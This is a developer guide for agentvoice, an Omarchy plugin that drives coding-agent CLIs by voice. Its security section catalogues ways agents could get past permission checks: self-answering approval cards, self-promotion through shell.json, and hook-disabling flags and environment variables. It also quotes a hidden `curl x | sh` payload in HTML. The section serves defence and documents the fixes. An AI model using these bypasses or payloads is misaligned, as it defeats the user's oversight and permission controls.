# Working on agentvoice

## Where to work: the clone, never the plugin folder

Work in the development clone, `~/Projects/agent-voice`. Never edit, test or
save notes through `~/.config/omarchy/plugins/duaneoca.agentvoice`.

The reason is Omarchy, not this project. The shell runs
`inotifywait -m -r -e close_write,create,delete,move` over the whole plugins
folder (`/usr/share/omarchy/shell/services/PluginRegistry.qml:726`) and
exempts only top-level hidden entries, `.git/` and `__pycache__/`
(`localPluginIdForPath`, :791). Any other write (a Markdown note, an
editor's swap file, a `.pytest_cache`) makes `shell.qml` call
`reloadPlugins()` after 150 ms, which unloads and reloads every panel,
service and widget on the desktop. That was bug H; one shell logged 507 of
those reloads in a day. Omarchy's files are never edited to fix it.

How it is laid out since M0:

- **The plugin path is a symlink** to a deploy checkout,
  `~/.local/share/agentvoice-plugin`. `inotifywait -r` does not follow a
  symlink, so nothing written in that checkout reloads anything, a deploy
  included. Omarchy finds, lists and loads the plugin through the link as
  before (`io.voxtype.settings` was already one); `omarchy plugin remove`
  unlinks it and leaves the checkout. Going back to a real folder: `rm` the
  link and `mv` the checkout back.
- **The deploy checkout changes only through `bin/agentvoice-deploy`**, run
  from the clone. It refuses a dirty clone, a red (strict) check, a target
  that is not its own checkout of this plugin or has local edits, and running
  from inside the plugins folder. It fetches the commit and checks it out
  detached, offers `./install.sh --yes` once the daemon is idle, and says
  (never runs) `omarchy-restart-shell` when QML changed: the shell reads QML
  only when it starts. The way back is the same command with an older
  commit; it prints the one it replaced and logs every deploy to
  `~/.local/state/agentvoice/deploys.log`.
- **`./bin/agentvoice-check` writes nothing in the tree**: no bytecode, no
  pytest cache, and its last line proves it. A file anything else writes
  during the run (an editor, an agent working in the clone) fails that line
  too, and the line names it.
- **Pushes go to `fork` only.** In the clone, `upstream` (duaneoca) has its
  push URL disabled and `remote.pushDefault` is `fork`. The deploy checkout
  has no `origin`, so `omarchy plugin update` refuses at the fetch instead of
  pulling someone else's HEAD onto a detached deploy.
- **After `omarchy-restart-shell`, the shell's watcher is new.** Moving a
  watched folder leaves the old watcher on its inodes under the old name; a
  restart is what ends that (found in M0).

## Before every commit

```bash
./bin/agentvoice-check
```

Fourteen static checks plus the test suite: two seconds for the checks, about
six minutes with the tests (5 min 46 s for 4,920 tests at M21, on the
i7-1185G7; it was two and a half minutes at about 2,800). The last check is that the run wrote
nothing in the tree (see above). It exists because
this project shipped a string of bugs that reached the user first: an unbound
shell variable, a gum box rendered 298 columns wide, a Python method whose
body was orphaned into dead code after a `return`, and three settings that
were declared in the manifest, wired through the daemon, and never drawn in
the UI. Every one of those is the kind a second of automation catches.

## What earns a test

Add one when you touch:

- **`speech_text.py`** — sentence boundaries and markdown flattening. Every
  rule there exists because something sounded wrong when spoken aloud.
- **`permission_hook.py`** — a bug here fails open. Anything that changes how
  a decision is reached needs a case proving silence, corruption and malformed
  input all still deny.
- **`runtime.Config`** — precedence and reload. A value the daemon read once
  and never again has caused two separate "it does nothing" bugs.
- **`adapters/`** — the streaming contract, the cold-stub check, and the
  permission posture of each backend under `ask_permission` on and off.

Do not try to test the QML's behaviour, the audio loop, or anything needing a
microphone. Those are exercised by hand, and `agentvoice monitor` exists so a
wake word can be diagnosed with numbers rather than guesses. The QML's
*property references* are checked: `qmllint` catches a control bound to a name
that does not exist, which is how `suffix` versus `unit` shipped.

## Testing the installer on a machine that is not yours

```bash
AGENTVOICE_BOX=1 ./bin/agentvoice-check      # or bench/install-in-a-box.sh
```

Eight real installs under bubblewrap with an empty HOME, no shell.json, no
systemd user bus, a cold uv cache and named commands withheld. Opt-in, because
each one downloads about 100MB.

Every install bug this project has had hid behind something the development
machine already had: a configured widget, a systemd session, `gum`, `uv`, a warm
cache. A first install died silently after 700MB because `jq` exits 2 on a
missing shell.json; another reported `pkexec: command not found` and exit 127
when it could not bootstrap uv. Neither was reachable here. If you change
`install.sh`, run the box.

A pass there means the pieces are on disk afterwards, not that the exit status
was 0 -- an installer that returns 0 having done nothing is the same false green
as a skipped suite.

## Testing on a runner that has nothing installed

```bash
python3 -m venv /tmp/ci && /tmp/ci/bin/pip install -q -r requirements-dev.txt
AGENTVOICE_STRICT=1 AGENTVOICE_PYTHON=/tmp/ci/bin/python ./bin/agentvoice-check
```

That is the `check` job: pytest and nothing else, because the daemon imports
numpy, piper and onnxruntime lazily, inside the functions that use them, so
the suite runs in seconds without a machine-learning wheel. The development
machine has all of them, which makes it the wrong place to find out whether a
new test can run anywhere else. Three red builds have come from this -- a
test that skipped on every runner, a search that prompted because ripgrep was
absent, and three driven tests that needed numpy for `frame_db`.

The matching rule: **a test that cannot run on the bare runner must either
not need the dependency, or be honest that it is skipping.** Which of the two
depends on what the test is for. `importorskip` is right for the numeric
code -- test_barge and the verifier negatives measure numpy's own output, and
there is nothing to check without it. It was wrong for the frame loop, whose
whole purpose is to execute the path a parser cannot see: skipping it on CI
would have left the one check that cannot be fooled running only on a laptop.
So the RMS is reproduced in the standard library there and asserted equal to
`frame_db` wherever numpy exists, which the `full` job guarantees is
somewhere.

The second job, `full`, installs the real stack and sets
`AGENTVOICE_NO_SKIPS=1`, because on a runner with everything available a skip
is a test that was meant to run and did not. Both jobs have to pass, and they
fail for opposite reasons: `check` fails if a test needs a wheel, `full` fails
if a test ducks out.

## Settings are three things, not one

A new setting is not done until all three exist, and the check script enforces
the last two:

1. `manifest.json` → `barWidget.schema` and `barWidget.defaults`
2. `daemon/runtime.py` → `DEFAULTS`, and `TOML_ALIASES` if it belongs in the
   fallback config
3. a page in `pages/` → an actual control, written with `s.put("key", ...)`

Skipping step 3 gives a setting that works from `omarchy bar set` and is
invisible in the UI. That has happened.

The overlay is `Settings.qml` -- the shared state, the store, the functions
that launch things, the conversation view and the permission prompt -- plus
one file per sidebar page in `pages/`, each handed the overlay as `s`. Each
key is changed on exactly one page (`test_settings_pages.py`); put it on the
page whose subject it is, not wherever there is room, or the page drifts back
into the twelve-box scroll it was split out of. Building blocks with no
setting names in them live in `ui/`. Both folders need their `qmldir` kept in
step (the check script does it).

Every field of a `voiceAgents` entry, its `main*` twin and the six
defaults-only keys have a home too: `FIELD_HOMES` in the same test, which
fails when the daemon reads a field with no home or a second page writes one.
`bench/key-inventory.py` prints key -> page -> control, to diff before and
after moving a control. And a button that destroys something is a
`ui/DangerButton` whose action runs in `onConfirmed`: `test_confirms.py`
lists each destructive command, where it is built, and fails if anything
reaches it from outside a confirmation. A new destructive command joins that
table.

Omarchy's Agents panel shows each voice agent from a record the daemon
writes (`daemon/agents_panel.py`). That panel is Omarchy's and is never
edited: what a section can show is a name, the plan text on its right and a
hover note, so the live status goes in the plan text. Its token and prompt
fields stay zero, because the agent's own collector already counts the CLI a
voice turn runs. The same scratch-directory trick renders the real panel:
copy `/usr/share/omarchy/shell/plugins/agents` beside `Commons` and `Ui`, put
records in `$XDG_STATE_HOME/omarchy/agents/usage/`, and stub
`omarchy-agent-usage-update` on PATH so opening it runs no collector.

## Read the theme through `Commons.Color`, never a bare `Color`

Under Qt 6.12 a bare `Color` is QtQuick's own value-type helper, and
`Color.tooltip.background` is `undefined`. The live shell happens to load
plugins with `import QtQuick 6.11`, which hides it -- but qmllint does not,
and the check failed on it 25 times before anyone looked; a standalone
Quickshell does not either. Omarchy's own QML writes `Commons.Color`, with
`import qs.Commons as Commons`, and so does every file here.
`test_no_qml_reads_a_colour_through_a_bare_color` holds it.

To see a QML change rather than guess at it: copy `Commons` and `Ui` from
`/usr/share/omarchy/shell` (copies -- Quickshell does not resolve the
singletons through a symlink) next to a `shell.qml` that instantiates the
file, run `qs -p` on that directory, and screenshot it with `grim`. It runs
beside the real shell and touches nothing of it.

`bench/preview/preview.sh` does all of that: `preview.sh --size 520x720
--shots 8 settings` walks the whole settings page a screenful at a time,
`--theme flexoki-light` checks a light theme, and `knob` drives a slider with
synthetic mouse events (QtTest's `TestEvent`), so nobody's real pointer
moves. `--arg '{"page":"agents","agent":"main"}'` opens a page, `popup`
draws the bar widget's popup with no bar behind it, and `clicks` drives
real controls and logs what each one wrote. `--state FILE` draws it as if
the service were running with that state file (`bench/preview/states/
showcase.json` is the one `preview.png` was made from): the file goes into a
scratch runtime directory and `agentvoice` becomes a stub that only answers
`is-active`. It never takes the keyboard (Exclusive focus is rewritten to None in
its copies) and never writes shell.json (`omarchy bar set` is stubbed to a
log). Two things it found out the hard way: a directory under `qs -p` needs a
`qmldir` before its files see each other as types, and a Timer placed
directly under `ShellRoot` never fires.

## Anything a model loads is reconciled, not constructed once

`Pipeline.apply()` decides when to rebuild the wake engine, the transcription
model and the speaker. A new model-backed setting belongs in the spec it
compares, or changing it will silently do nothing until the service restarts.
Include a file mtime when the artifact can be rewritten underneath it — that
is why the verifier's mtime is in the wake spec.

Release what you replace. Dropping the reference is not enough: glibc keeps
the arena and RSS barely moves, so call `Pipeline._release()`, which also
runs `malloc_trim(0)`.

Four bugs of this shape shipped in one evening, so the rule is narrower than
"re-read your settings" -- an audit found all twenty-five settings reconciled
already. It is about values that live on a *constructed object*:

- a constructor argument belongs in the spec, because changing it means
  building the thing again: the wake model, the phrase, `useVerifier`;
- a plain attribute is assigned after the spec check, because rebuilding
  ~100MB for a number is waste: `owwThresholdPct`, the gate, the timings;
- anything read from a **file** is reconciled outside the config-changed
  guard, because a file changes with no setting change at all: the verifier's
  mtime, a Piper voice arriving, `vocab.txt`.

Get the first two the wrong way round and the setting either does nothing or
reloads a model on every poll. Miss the third and the fix waits for something
unrelated to be touched, which is how "switching engines and back" became
folklore for "make it notice".

## Ten ways this fails open, and the rules that close them

Each of these was a real path from "somebody said something near the
microphone" to "something ran". They are listed because every one of them is
invisible in a passing test run.

**A hook that cannot answer is a hook that permitted it.** Claude Code treats
any exit from `permission_hook.py` other than 0-with-a-decision or 2 as a
*non-blocking* error: the tool proceeds. So a traceback there is not "the
guard broke", it is "the guard was absent". `main()` catches `BaseException`
and every path out of it emits a decision. The hook command is also
`shlex.quote`d, because it is run by a shell and a space in `$HOME` gives
exit 127, which fails open the same way. Since M16 it also writes an audit
line per decision, and that line is written *after* the decision is on
stdout, outside main()'s catch and inside its own: a record that raises,
hangs on the lock or is interrupted must change nothing, and a test makes
it do all three.

**A path that does not exist yet still has to be judged.** `Path.exists()`
follows symlinks, so a *dangling* link counted as "not there" and only its
parent was resolved -- which put `notes.txt -> ~/.config/systemd/user/x.service`
inside the project. Use a plain non-strict `resolve()`, which follows what it
can and leaves the rest.

**"edits" is a statement about source files.** `paths.scope_root` returns
`None` rather than the home directory when no project is configured, because
home holds `shell.json`, which holds the permission level -- an agent that
could write it unasked could promote itself to "trusted". And inside a real
project, anything that *makes something else run* still asks:
`.claude/settings.json`, `.mcp.json`, `.envrc`, `.git/hooks/*`, a `.joblib`.
`NEVER_SILENT` is that list.

**A tool is judged by what it returns, not by what it was handed.**
`_paths_in` reads a tool's *arguments*, which describes a read exactly -- the
argument is the file -- and describes a search not at all: `Grep`'s arguments
are a pattern and a directory while its output is whatever lies beneath one.
So reading `credentials.json` asked and grepping the folder it sits in did
not, for the same bytes. Found by a marketplace reviewer against cba1abf,
after the adversarial review and 569 tests had both missed it. `CONTENT_SEARCH`
is the list of tools that hand back file contents they were never asked for by
name, and for those the check runs over what `rg --files` says the search
would actually read -- which applies .gitignore, so an ignored `.env` that
could never appear in results does not produce a prompt about nothing. Glob is
deliberately not on that list: it returns paths, and that a file exists is a
smaller thing than what is in it.

**Spoken text must not travel in argv.** `/proc/<pid>/cmdline` is mode 0444
with no hidepid on an ordinary Linux box, so anything passed as a command-line
argument is readable by every local account for as long as the process lives.
For a daemon whose input is whatever somebody said out loud, that is their
speech. Four adapters did it; `base.feed()` now hands the prompt over on stdin
and closes it, which is also what tells a CLI the prompt has ended. Per CLI
rather than in general, because a prompt written to a channel a CLI does not
read is a turn that hangs until the watchdog kills it: `claude -p` and `codex
exec` take it bare, `gemini` needs an empty `-p ""`, `agy` needs the
stream-json protocol because its `-p` eats the following flag, and of the ten
once on the shared adapter only `copilot` could be shown to accept it. The
other nine were removed rather than shipped leaking, because none would run
far enough to say where its prompt goes and a prompt sent down a channel a
CLI is not reading hangs the turn. That is the standing rule for this table:
a backend earns its place with one real turn, or it is not offered. The
endpoint adapter never had this: an HTTPS body is not argv.

**An answer is only as good as whoever sent it.** Until M7 a card's
answer was a file under `$RUNDIR/permissions/`, and anything running as the
user could write it, so an agent at Trusted could answer its own card with
`agentvoice permit ID allow`. Now the daemon holds every card (`cards.py`)
and takes an allow only from a caller it checked by the kernel's word: the
live Omarchy shell's direct child, reading that shell's own pipe, carrying
the card's one-use nonce and digest, while unlocked. Anything else
*denies* the card. It is not ignored, because a forged yes that merely
fails leaves the question up for the next try. Two things follow. A new
way to answer a card goes through `Desk.answer` and nowhere else. And an
asker trusts only a listener that is its own ancestor, since any process
can bind a socket at that path. What this cannot stop (a plugin dropped
into the shell, injected input, a race on the overlay's pipes) is written
in phaseM7notes.md, and it is why "ask me first" is advisory for Trusted
agents.

**A link that was there when the work was asked for is not a link now.**
Since M8 an agent reaches another only along a link on the Crew map
(`crew_links.py`), and the person can delete one, or quarantine an agent,
while a card is up, while a task queues or while an answer is being
written. So the links are judged four times, each against the settings
read fresh (`Runtime._crew`, never the copy the daemon last loaded): at the
request, after the approval, when queued work starts and when its result
is delivered; and the poll (`Runtime.sweep`) refuses queued work and
cancels running work whose link or quarantine moved. A new way for one
agent to reach another -- chat search (M20), announcements (M27) -- calls
`crew_links.refusal` at each of those points, and an unreadable list
refuses it. Chat search has no target and no queue, so it calls
`search_refusal`, the same reading with only the unreadable and quarantine
halves, at the call and again before its answer is handed back; and it
judges each chat with `may_replay` (or the `all` scope) *before* the chat
is matched, counted or quoted, because a count is a disclosure too.

**A switch that says off has to be off where the CLI looks.** `claude -p`
starts every MCP server in the user's own settings, every project's
`.mcp.json` (unapproved) and every plugin's, whatever Agent Voice passes, so
until M10 a Claude agent had servers nobody had switched on for it. Every
Claude turn now carries `--strict-mcp-config` and only the servers named in
a 0600 file (`base.private_config_file`; a definition can hold a key, argv
is world readable), and Codex gets `enabled=false` for every config.toml
server not switched on -- named only when the file has it, because naming
one that is not there stops Codex from starting. A switch says "enforced"
only where a recorded turn shows it (`tests/fixtures/tools/`): a CLI is
"told, not enforced", because Claude's deny rules stop `gh` and not `sh -c
'gh'`. A new way to hand an agent a tool goes through `tooldetect.delivery`
and the hook's `detected_refusal`, and is off until a switch approves its
fingerprint. Skills the same way since M11: `claude -p` and `codex exec` load
every skill in the user's own folders whatever Agent Voice gives them, so
a skill switched off is switched off where the CLI looks too
(`skillOverrides`, `skills.config`: `skillscan.native_off`), and a list
that cannot be read switches off every one the CLI finds.

**A flag the person adds is still a flag.** Since M17 an agent's program can
be given extra flags and environment variables (Agent details → Advanced),
and one of either switches the guard off: `--bare` and `--safe-mode` start
Claude Code with no hooks, `CLAUDE_CODE_SIMPLE=1` does the same, `PYTHONPATH`
loads code into the hook itself, `ANTHROPIC_BASE_URL` sends the key
elsewhere. So `launch_extras.py` judges both **in the adapter, at launch**
(`_extras_argv`, `_popen_env`), refuses even after a confirm and whoever
wrote the setting, and a refusal starts no process and says why -- dropping
the flag quietly would be a control that does nothing. The list is per
program and written three ways (exact names off `--help`, category words
that catch next month's flags, and shapes: no bare word, no `--`, one short
flag per element); a program with no list is passed nothing. A new adapter
that takes extras needs its own list first, and a new flag Agent Voice sets
itself joins the list as `own`.

**A transcript and a model reply are untrusted input to the UI.** Any `Text`
showing one needs `textFormat: Text.PlainText`: `AutoText` renders anything
that looks like HTML, and `ls <b></b><!-- ; curl x | sh -->` displays as `ls`
in the permission prompt. Anything printed goes through
`speech_text.safe_for_terminal` first, and anything becoming an argv element
through `as_prompt`.

And one shape rather than a rule: `omarchy-launch-floating-terminal-with-presentation`
takes a *command line*, not an argv -- it does `cmd="$*"` and runs
`bash -c "$cmd"`. Everything handed to it is shell source, so every argument
is quoted (`shq` in the QML), and a value read out of `shell.json` is checked
against the shape it should have before it gets that far.

## The microphone closes while the screen is locked

Not a setting. A locked machine that still answers a wake word undoes every
permission decision in this project by letting anyone walk up to the desk, so
there is nothing to switch off.

Two flags, and this is the part to get right: `Daemon.enabled` is what the
*user* asked for -- the panel switch, the panic keybind -- and `Daemon.locked`
is what the *session* is doing. Listening needs both (`Daemon.listening`).
Nothing is saved and restored around a lock, so there is no stored copy to
fall out of step, and unlocking cannot turn the microphone on for somebody
who had deliberately turned it off. Toggling `enabled` on lock would do
exactly that.

Three things have to happen on the way in, and each of them was a separate
leak:

- **the frames are dropped before anything measures them**, not after the
  wake word scores them;
- **a capture already underway is abandoned, not suspended.** Frames stop
  arriving either way, but `buf` keeps what was recorded up to the lock, so
  the utterance would resume on unlock joined to whatever was said next;
- **the HUD hides at once, with no linger.** It is a layer-shell surface, so
  it draws *over* the lock screen -- lingering leaves the last thing you said
  and the last thing the agent answered on a locked machine's display.

Detection is Omarchy's own `omarchy-hyprland-session-locked` rather than a
reimplementation, because the subtleties belong to whoever maintains it:
Hyprland reports no lock state directly, so it infers one from
`solitaryBlockedBy`, and that stays set once the lock's client has died. Its
exit 2 ("undetermined") becomes `None` here and the daemon keeps whatever it
last knew -- `false` is the fail-open answer and `true` would shut the
microphone for good on a machine with no compositor to ask, which is every
development run in a terminal. When nothing can answer at all, the daemon
*says so*: a fail-open nobody is told about is worse than either answer.

The 2s idle poll is the mechanism, because it needs nothing installed and
cannot be forgotten. `agentvoice lock` and `agentvoice unlock` exist for
binding to whatever locks the screen if that window matters; they are an
optimisation, not the guarantee.

To check it without locking yourself out: `agentvoice lock`, then
`agentvoice locked` and `agentvoice status`, then `agentvoice unlock`. To
check the real thing, lock the screen and read `journalctl --user -u
agentvoice -f`.

Since M27 a lock stops every turn under way but not an idle agent's
background work (a command or helper it was asked for before the lock,
`Adapter.background_running()`): that keeps going, as a delegated task
always did, and its finish is a notification only. `silence()` is where
that is decided, and nothing else may keep a process alive through a lock.

## A warm process talks between turns

Claude Code's warm process is not quiet between turns (M27, recorded in
`tests/fixtures/background/`): when background work it started finishes,
it writes `task_notification` and then takes a whole turn by itself, with
its own `result`. Nothing read stdout between turns before M27, so the next
turn's reading took that `result` for its own and answered the person's new
question with the background report. So:

- **One reader per process.** `Pump` reads every line a claude process
  writes, from its first turn on; a turn registers with `pump.begin()` and
  gets its lines in order. Nothing else calls `readline()` on it.
- **A turn starts at its own echo.** Every turn carries
  `--replay-user-messages`; until the echo arrives, lines that belong to an
  unprompted turn (one due or under way) are that turn's. The recording
  shows the CLI answering a finish first when both arrive together.
- **Only tracked work speaks up.** An announcement comes from a task the
  daemon started and saw end, or from the CLI's own `task_notification` for
  a task that process started in the background. An unprompted turn with no
  finish before it is read and dropped; no CLI verb, crew tool or file can
  file one (`test_announce.py` holds the callers). Its notification text is
  fixed, because `notify-send` takes it in argv.
- **Announcing never stops the agent.** Its process may still be doing other
  background work; a lock, a stop or the interrupt cuts the line and
  nothing else.

## A control with more than one way in needs one guard, not one each

Two bugs of this shape in one afternoon, both reported as "I can't turn it
on" with nothing on screen to explain it.

`toggleService` had three callers: the panel's switch, the bar icon's middle
click, and its right click. Hiding the switch when no engine is installed
looked like a fix and guarded one of the three. `toggleMic` had two, and the
bar's right click reached the Process directly, so it never checked that
`agentvoice` existed at all. The guard belongs in the function every entry
point must pass through, and a test asserts the caller count so that dropping
to one caller makes someone re-read the reasoning rather than quietly
loosening it.

The matching rule for the user: **a control that does nothing must say why.**
Silence cannot be told apart from a broken install, which leaves nothing to
act on. `note` exists for that, the panel draws it, and it clears itself when
the thing it complained about stops being true -- a message that outlives its
cause is its own bug. A spawn that never started is distinguishable from a
command that ran, because `onExited` is not emitted for the first; use
`running` going false, which is emitted for both.

And the two controls are not interchangeable. The switch stops the *service*,
which unloads ~600MB and costs three to four seconds to come back. Mute
releases the *microphone* and keeps everything warm. Someone who only knows
about the switch will use it as a mute and pay that price every time --
which is exactly what happened here, because mute was reachable only by a
right click and a keybind, and neither announces itself. Anything that
changes what the microphone is doing belongs somewhere a person can find it.

## What is pinned, and what is deliberately not

**Models are pinned and verified.** `models.lock` holds the piper-voices
revision and a sha256 for every file an install downloads; all three scripts
that fetch one read it, and `download()` refuses a file whose hash does not
match and a file with no hash at all. A voice absent from the lock is not
installable, so adding one to `Settings.qml` means adding it to the lock --
check 9 fails otherwise. Refresh with `./bench/pin-models.sh > models.lock`,
which costs one API call because the `.onnx` hashes come from Hugging Face's
own LFS metadata rather than from downloading a gigabyte of voices.

**Python dependencies are not pinned, and that is the open question.**
`requirements*.txt` give ranges, so six declared packages resolve to about
forty distributions at whatever version is newest that day. The protection a
lockfile with `--generate-hashes` would buy is real -- a compromised release
of any of those forty runs code at install time -- but the cost is the thing
`requirements.txt` was deliberately built to avoid: a pinned numpy against a
newer CPython is exactly the breakage that comment is about, and a lockfile
nobody refreshes rots into a worse state than a range.

**Deferred, on purpose:** work out a refresh routine first -- who regenerates
the lock, how often, and what tells you it has gone stale -- and only then
add the lock. A lockfile without that routine is a snapshot of one afternoon.

## A check that reads the code is not a check that the code ran

`logSpeech` is off by default, so the words somebody said are not written to
the journal -- the journal keeps entries for weeks, and "log the replies"
means keeping a transcript of everything the agent read out, including file
contents and key names. The structural lines are never gated: timings, wake
events, tool markers, lock transitions, errors. Nearly every bug here was
found from those rather than from the words.

The way that was *verified* is the part worth writing down, because it failed
twice in the same direction. The audit grepped for `print(` and looked for
content on that line; the completed-transcript print wraps, and its first
physical line holds a carriage return and 120 spaces and nothing else. Then
journalctl renders a line containing a `\r` as `[214B blob data]`, so reading
the journal for leaked speech also found none. Two independent checks, both
clean, and the transcript had been going to the journal the whole time. A
reviewer found it by opening the file.

So, in order of how much they are worth:

- **run it and look at the output.** The frame loop is driven in
  `test_states.py` by putting a fake `sounddevice` in `sys.modules` -- the
  import is inside `run()` -- whose stream delivers frames from its own
  thread the way PortAudio does. Real frame sizes, real `frame_db`, real
  endpointing. It reads *both* streams, because systemd journals stderr too.
  `tests/frame_loop.py` does the same over a scripted microphone on a fake
  clock (200ms of audio time per frame), so a ten-minute open-mic window
  runs in milliseconds and "within one frame" is a number in the assertion.
- **parse it, never grep it.** The audit is an AST walk and matches on every
  identifier a `print` reads, at any depth. Matching on the presence of
  `safe_for_terminal` in the source was worse than it looked: it only fired
  when a second rule was already being kept, so a print interpolating a raw
  transcript would have passed by being wrong twice.
- **mutate it.** A test that has never failed is a guess. Reintroduce the
  leak and watch the test go red -- all three of the gate's mutations are
  caught, and the identifier-based audit catches one the substring version
  passed.

And when checking the journal by hand, `journalctl -o json`: the default
renderer hides exactly the lines most likely to carry speech, because a
progress line rewrites itself with a carriage return.

## Claims in the README and in commits

Measure before asserting. `bench/FINDINGS.md` records what was measured, on
what hardware, with the numbers. If a claim there turns out to be wrong,
correct it in place rather than leaving two versions of the truth — the
Voxtype-transcription architecture and the "31% of one core" figure were both
wrong, and both are now written down as corrections with the reasoning.

Say which backends have actually answered a turn. Claude Code, Codex,
Gemini, Antigravity and Copilot have, and nothing else is offered. Watching a single
live turn falsified three things Gemini's adapter believed -- where the CLI
records its auth, that a headless run needs no trusted folder, and that
everything on stdout was speech -- and nothing in Codex's. Flags read off
`--help` are a hypothesis, not a contract; record what a real turn emitted,
and replay it in a test so a schema change fails loudly rather than going
quiet.

The same rule decides which backends keep a conversation when an agent is
rebuilt for a new permission level or model (M2, bug I): an entry in
`carries_session_across` needs three recorded turns in
`tests/fixtures/resume/` -- the old flags, the new ones resuming, and back.
Claude Code and Codex have them; agy could not be signed in to record one,
so it starts a new chat on a level change and says why on the HUD. The
adapter is rebuilt either way: no process started under the old flags takes
another turn, and a kept session loses its "allow all in this chat" grants
when the level changed.
